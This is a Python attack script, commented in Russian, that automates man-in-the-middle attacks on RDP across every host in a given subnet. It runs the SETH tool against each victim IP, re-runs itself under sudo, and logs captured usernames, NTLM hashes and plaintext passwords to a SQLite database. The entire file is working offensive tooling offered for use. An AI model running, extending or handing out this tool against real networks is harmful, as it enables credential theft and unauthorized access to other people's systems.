#!/usr/bin/python3

"""
Автоматизация атак Man-in-the-Middle (MITM) для протокола RDP на множественных узлах.
Инструмент предназначен для эксплуатации уязвимости в рамках локальной сети, позволяя
одновременно проводить атаку на несколько узлов, заданных в формате подсети.

Авторы: @suzu
"""

# ====================================================================
# Импорты
# ====================================================================

import argparse
import subprocess
import socket
import os
import sys
import threading
import sqlite3
import ipaddress
import warnings
import logging

from colorama import Fore, Style, init
from scapy.all import ARP, Ether, srp, conf
from concurrent.futures import ThreadPoolExecutor
import psutil

# ====================================================================
# Настройка логирования и подавление предупреждений
# ====================================================================

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Подавление предупреждений Scapy
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", category=UserWarning)


# ====================================================================
# Инициализация цветового вывода
# ====================================================================

init(autoreset=True)


# ====================================================================
# Класс SethDatabase
# ====================================================================

class SethDatabase:
    """
    Класс для управления взаимодействием с базой данных Seth.
    """

    def __init__(self, db_path='suzu.db'):
        self.db_path = db_path
        self._initialize_database()

    def _initialize_database(self):
        """Создаёт таблицу seth в базе данных, если она не существует."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS seth (
                    IP VARCHAR PRIMARY KEY,
                    status TEXT NOT NULL,
                    username TEXT,
                    hash TEXT,
                    password TEXT,
                    date_added TEXT NOT NULL
                )
            ''')
            conn.commit()

    def add_captured(self, victim_ip, status, username=None, hash_value=None, password=None):
        """
        Добавляет запись о захваченном IP-адресе и данных аутентификации.

        :param victim_ip: IP-адрес жертвы.
        :param status: Статус (например, 'scanned' или 'exploited').
        :param username: Имя пользователя (если имеется).
        :param hash_value: NTLM-хэш (если имеется).
        :param password: Пароль в открытом виде (если имеется).
        """
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO seth (IP, status, username, hash, password, date_added)
                VALUES (?, ?, ?, ?, ?, datetime('now'))
            ''', (victim_ip, status, username, hash_value, password))
            conn.commit()

    def get_all_records(self):
        """Возвращает все записи из таблицы seth."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM seth')
            return cursor.fetchall()

    def clear_database(self):
        """Очищает таблицу seth в базе данных."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('DELETE FROM seth')
            conn.commit()
        print(f"{Fore.YELLOW}База данных очищена.{Style.RESET_ALL}")


# ====================================================================
# Класс SethMitm
# ====================================================================

class SethMitm:
    """
    Класс для управления Man-in-the-Middle атаками с использованием SETH.
    """

    def __init__(self, db, interface, subnet, server_ip):
        self.db = db
        self.interface = interface
        self.subnet = subnet
        self.server_ip = server_ip
        self.attacker_ip = self._get_ip_address()

    def _get_ip_address(self):
        """Возвращает IP-адрес для заданного сетевого интерфейса."""
        addresses = psutil.net_if_addrs()
        if self.interface not in addresses:
            raise ValueError(f"Интерфейс {self.interface} не найден")
        for addr in addresses[self.interface]:
            if addr.family == socket.AF_INET:
                return addr.address
        raise ValueError(f"IP-адрес не найден для интерфейса {self.interface}")

    def scan_network(self):
        """Сканирует сеть и возвращает список активных IP-адресов."""
        try:
            ip_network = ipaddress.ip_network(self.subnet)
            return [str(ip) for ip in ip_network.hosts()]
        except ValueError:
            sys.exit(f'{Fore.RED}{self.subnet} не подходит под формат подсети{Style.RESET_ALL}')

    def display_information(self, valid_ips):
        """
        Выводит информационное окно с данными о подключении и активных узлах.

        :param valid_ips: Список IP-адресов для атаки.
        """
        print(f"\n{Fore.CYAN}{'-' * 40}")
        print("ИНФОРМАЦИОННОЕ ОКНО")
        print(f"Сетевой интерфейс: {Fore.GREEN}{self.interface}{Style.RESET_ALL}")
        print(f"IP атакующего: {Fore.GREEN}{self.attacker_ip}{Style.RESET_ALL}")
        print(f"IP сервера: {Fore.GREEN}{self.server_ip}{Style.RESET_ALL}")
        print("Подсеть: " + Fore.GREEN + self.subnet + Style.RESET_ALL)
        print(f"\nЗапуск атаки на {len(valid_ips)} узлов:")
        print(f"{Fore.CYAN}{'-' * 40}{Style.RESET_ALL}\n")

    def run_seth_on_ips(self):
        """
        Запускает SETH для каждого IP-адреса, который ещё не захвачен.
        """
        active_ips = self.scan_network()
        captured_ips = {record[0] for record in self.db.get_all_records()}
        valid_ips = [
            ip for ip in active_ips
            if ip != self.attacker_ip and ip != self.server_ip and ip not in captured_ips
        ]

        # Вывод информационного окна перед атакой
        self.display_information(valid_ips)

        stop_event = threading.Event()
        with ThreadPoolExecutor(max_workers=len(valid_ips)) as executor:
            for victim_ip in valid_ips:
                executor.submit(self.run_seth, victim_ip, stop_event)

    def run_seth(self, victim_ip, stop_event):
        """
        Запускает SETH на указанном IP жертвы и обрабатывает вывод.

        :param victim_ip: IP-адрес жертвы.
        :param stop_event: Событие для остановки потоков.
        """
        process = subprocess.Popen(
            ["./seth.sh", self.interface, self.attacker_ip, victim_ip, self.server_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        while not stop_event.is_set():
            line = process.stdout.readline()
            print(line)
            if line and "Got it" in line:
                print(f"\n{Fore.GREEN}Получено соединение от {victim_ip}{Style.RESET_ALL}")
                self.db.add_captured(victim_ip, "scanned")
                stop_event.set()
                self.monitor_process(process, victim_ip)
                break

            if process.poll() is not None:
                break

    def monitor_process(self, process, victim_ip):
        """
        Мониторит процесс SETH и выводит учётные данные.

        :param process: Процесс SETH.
        :param victim_ip: IP-адрес жертвы.
        """
        while True:
            line = process.stdout.readline()
            print(line)
            if 'Done' in line or 'Cleaning up' in line:
                print(f"{Fore.CYAN}Атака завершена для {victim_ip}{Style.RESET_ALL}")
                with open('test.txt', 'r', encoding='utf-8') as f:
                    print(f.readlines())
                with open('test.txt', 'w', encoding='utf-8') as f:
                    f.write('')
                os.execvp('sudo', ['sudo', 'python3'] + sys.argv)


# ====================================================================
# Основная функция
# ====================================================================

def main():
    # Проверка, запущен ли скрипт от имени root
    if os.geteuid() != 0:
        os.execvp('sudo', ['sudo', 'python3'] + sys.argv)

    parser = argparse.ArgumentParser(description="Seth Automation Script")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    mitm_parser = subparsers.add_parser('mitm', help='Запуск SETH для MITM-атаки')
    mitm_parser.add_argument('-i', '--interface', required=True, help="Сетевой интерфейс")
    mitm_parser.add_argument('-s', '--subnet', required=True, help="Подсеть для прослушивания")
    mitm_parser.add_argument('-r', '--server', required=True, help="IP-адрес сервера")

    subparsers.add_parser('show', help='Показать все захваченные данные')
    subparsers.add_parser('clear', help='Очистка базы данных')

    args = parser.parse_args()

    db = SethDatabase()  # Инициализация базы данных

    if args.command == 'mitm':
        mitm = SethMitm(db, args.interface, args.subnet, args.server)
        mitm.run_seth_on_ips()

    elif args.command == 'show':
        records = db.get_all_records()
        if records:
            for record in records:
                ip, status, username, hash_value, password, date_added = record
                print(f"{Fore.YELLOW}IP: {ip}, Status: {status}, Username: {username or 'N/A'}, "
                      f"Hash: {hash_value or 'N/A'}, Password: {password or 'N/A'}, Date Added: {date_added}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Записей не найдено в базе данных.{Style.RESET_ALL}")

    elif args.command == 'clear':
        db.clear_database()


if __name__ == "__main__":
    main()
